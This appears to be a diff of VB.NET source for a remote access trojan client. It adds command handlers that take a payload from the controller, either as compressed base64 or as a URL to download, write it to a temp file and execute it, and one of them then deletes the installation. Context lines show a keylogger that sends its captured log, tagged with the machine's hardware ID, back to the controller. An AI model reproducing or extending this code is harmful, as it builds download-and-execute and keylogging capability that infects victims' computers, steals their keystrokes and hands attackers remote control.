@@ -36,6 +36,18 @@
                                 End
                             Case "3"
                                 C_Installation.DEL()
+                            Case "4"
+                                Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(2))
+                                IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(3)), False))
+                                Threading.Thread.CurrentThread.Sleep(1000)
+                                Diagnostics.Process.Start(NewFile)
+                                C_Installation.DEL()
+                            Case "5"
+                                Dim NewFile = IO.Path.GetTempFileName + A(3)
+                                Dim WC As New Net.WebClient
+                                WC.DownloadFile(A(2), NewFile)
+                                Threading.Thread.CurrentThread.Sleep(1000)
+                                Diagnostics.Process.Start(NewFile)
                         End Select
 
                     Case "Visit"
@@ -46,9 +58,6 @@
                         IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(2)), False))
                         Threading.Thread.CurrentThread.Sleep(1000)
                         Diagnostics.Process.Start(NewFile)
-                        If A(3).ToString = "update" Then
-                            C_Installation.DEL()
-                        End If
 
                     Case "RU-"
                         Dim NewFile = IO.Path.GetTempFileName + A(2)
@@ -56,9 +65,6 @@
                         WC.DownloadFile(A(1), NewFile)
                         Threading.Thread.CurrentThread.Sleep(1000)
                         Diagnostics.Process.Start(NewFile)
-                        If A(3).ToString = "update" Then
-                            C_Installation.DEL()
-                        End If
 
                     Case "KL"
                         C.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(C_Keylog.filepath))
